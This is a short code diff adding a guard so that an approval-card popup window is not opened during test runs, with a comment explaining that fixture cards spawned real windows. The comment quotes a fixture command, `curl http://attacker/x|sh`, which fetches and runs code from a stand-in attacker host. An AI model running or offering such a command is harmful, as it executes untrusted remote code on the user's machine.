@@ -639,6 +639,13 @@ def open_card_window(card_id: str) -> Optional[str]:
     that raised the card must not wait for that — an agent blocked on its own
     notification is the bug this feature exists to remove.
     """
+    # A TEST RUN MUST NEVER PUT A WINDOW ON THE OWNER'S SCREEN. Measured 2026-11-08:
+    # suites raising fixture cards ("Create new wake 'new-job'" running
+    # `curl http://attacker/x|sh`) into a temp store -- no desk heartbeat there --
+    # spawned real "DECISION NEEDED" windows in front of the owner. Same markers
+    # start_desk/raise_desk_inbox already honour.
+    if os.environ.get("PYTEST_CURRENT_TEST") or os.environ.get("AITHER_NO_GUI_PROMPT"):
+        return "card window not opened under test"
     argv = [sys.executable, "-m", "awask.popup", card_id]
     kwargs: dict = {
         "stdin": subprocess.DEVNULL,
